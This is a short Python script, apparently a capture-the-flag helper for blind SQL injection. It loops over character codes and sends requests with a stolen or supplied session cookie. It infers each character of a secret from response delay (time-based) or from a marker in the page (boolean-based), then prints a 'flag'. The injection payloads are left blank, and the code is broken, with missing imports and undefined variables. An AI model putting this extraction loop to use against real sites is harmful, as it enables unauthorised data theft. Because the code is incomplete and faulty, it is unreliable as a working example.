import requests

c=input('ENTER PHPSESSID cookie')
cookies = {'PHPSESSID':c}


url=input('Enter url:')


for i in range(1,10):
	for j in range(44,129):
		query=url+"   "                 #payload here
		s=time()
		res=requests.get(query)
		t=time()
		d=t-s
		if(d >1):
			str2+=chr(j)
			print(str2)
			break


str1=''
for i in range(1,l):
	asw=0
	for j in range(32,126):
		query=url+"  "  #payload here
		print(query)
		req=requests.get(query,cookies=cookies) 
		res=req.text
		print(chr(j))
		if cmp in res:
			str1+=chr(j)
			print(str1)
			asw=1
			break
	if(asw==0):
		str1+="_"
print("flag="+str1)
'''
for i in range(44,128):
	query=url+"pw=735c2"+chr(i)+"73"
	req=requests.get(query,headers=headers) 
	print(query)
	res=req.text
	print(chr(i))
	if cmp in res:
		str1+=chr(i)
		print(str1)
		asw=1
		break
		'''